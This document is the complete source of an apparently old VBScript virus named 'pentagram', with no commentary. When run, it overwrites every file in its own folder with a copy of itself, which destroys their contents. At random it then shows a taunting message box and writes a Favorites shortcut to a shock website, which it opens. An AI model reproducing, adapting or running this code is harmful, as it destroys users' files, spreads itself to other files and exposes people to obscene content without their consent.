Dim pentagram, WshShell, FSO, VX, VirusLink
On Error Resume Next
Randomize
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
pentagram = Wscript.ScriptFullName
VX = Left(pentagram, InStrRev(pentagram, "\"))
For Each target in FSO.GetFolder(VX).Files
  FSO.CopyFile pentagram, target.Name, 1
Next
If Int((2 * Rnd) + 1) = 1 Then
  MsgBox "HAIL M�XIMUM_ɮŧE", 4096 , "VBS.=)"
  Set VirusLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\pentagram.URL")
  VirusLink.TargetPath = "http://vagina.rotten.com/fidel/"
  VirusLink.Save
  WshShell.Run ("C:\WINDOWS\Favorites\pentagram.URL")
End If
'pentagram

